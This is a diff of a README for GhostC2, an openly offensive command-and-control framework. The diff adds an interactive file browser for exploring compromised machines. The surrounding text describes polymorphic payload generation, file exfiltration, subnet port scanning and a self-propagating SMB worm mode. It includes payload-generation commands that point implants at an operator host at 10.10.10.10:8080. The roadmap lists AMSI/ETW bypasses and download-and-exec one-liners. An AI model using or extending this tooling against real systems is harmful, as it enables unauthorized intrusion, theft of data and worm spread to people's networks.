@@ -1,6 +1,6 @@
 # 👻 GhostC2
 
-GhostC2 is a modular, encrypted, post-exploitation command-and-control (C2) framework built with Python and Flask. It features real-time WebSocket communication, polymorphic payload generation, operator authentication, and optional `.exe` packaging. 
+GhostC2 is a modular, encrypted, post-exploitation command-and-control (C2) framework built with Python and Flask. It features real-time WebSocket communication, polymorphic payload generation, operator authentication, optional `.exe` packaging, and a fully interactive file browser UI.
 
 Check out the wiki for an Operator Quickstart Guide.
 
@@ -16,7 +16,14 @@ Check out the wiki for an Operator Quickstart Guide.
 - 🛡️ Flask-Login based access control
 - 🗞️ SQLite-based task/result logging
 - 🔍 Network Port Scanning (`scan <subnet> ports:<port1>,<port2>...`)
+- 📂 Interactive File Browser UI (NEW)
 - 🧬 Self-Propagating Worm Mode via SMB
+
+---
+
+> **NOTE:**  
+> The new file browser feature currently requires payloads generated *without* command obfuscation enabled.  
+> Structured/obfuscated custom task support is coming soon!
 
 ---
 
@@ -85,17 +92,12 @@ python tools/generate_payload.py --exe
 
 ### 🌐 Example: Generate payload for 10.10.10.10
 ```bash
-python tools/generate_payload.py \
-  --c2 http://10.10.10.10:8080/beacon \
-  --result http://10.10.10.10:8080/result
+python tools/generate_payload.py   --c2 http://10.10.10.10:8080/beacon   --result http://10.10.10.10:8080/result
 ```
 
 To also compile to `.exe`:
 ```bash
-python tools/generate_payload.py \
-  --c2 http://10.10.10.10:8080/beacon \
-  --result http://10.10.10.10:8080/result \
-  --exe
+python tools/generate_payload.py   --c2 http://10.10.10.10:8080/beacon   --result http://10.10.10.10:8080/result   --exe
 ```
 
 ---
@@ -114,6 +116,36 @@ GhostC2 includes a web-based console for interacting with beacons in real-time.
 
 ---
 
+## 📂 Interactive File Browser (NEW)
+
+GhostC2 now supports an interactive file browser for any active beacon.
+
+- Browse directory trees live in the dashboard
+- Supports both Linux and Windows paths
+- Handles missing/ghost files gracefully
+- Requires agent to run **without command obfuscation enabled** for now
+
+### Command
+```bash
+browse <path>
+```
+Examples:
+```bash
+browse /
+```
+or
+```bash
+browse C:```
+
+**To use:**  
+- Click the 📁 "Browse" button for any beacon in the dashboard
+- Navigate folders, see files/sizes, and explore the target system
+
+**Note:**  
+Obfuscation support for custom tasks is **coming soon** (see roadmap below).
+
+---
+
 ## 📂 File Exfiltration
 
 ### Command
@@ -129,7 +161,7 @@ Agent will:
 
 ---
 
-## 🔍 Network Scanning (New)
+## 🔍 Network Scanning
 
 ### Command
 ```bash
@@ -153,7 +185,7 @@ $ scan 127.0.0.1/32 ports:80
 
 ---
 
-## 🧬 Worm Propagation Mode (New)
+## 🧬 Worm Propagation Mode
 
 Payloads generated with `--worm` will:
 - Scan local subnet for port 445
@@ -243,11 +275,16 @@ send_from_directory('payloads', filename)
 
 ---
 
-### 🧠 Roadmap
+## 🧠 Roadmap
+
 - `.hta`, `.bat`, and `.vbs` wrappers
-- AMIS/ETW bypass options
-- Obfuscation toggle
+- AMSI/ETW bypass options
+- Full support for command obfuscation in custom tasks (`browse`, etc.)
+- Dashboard-based file download from browser view
+- JSON/structured tasking for all agent features
 - Dashboard-based one-liners for download & exec
+
+---
 
 ## 🔐 Security Notes
 
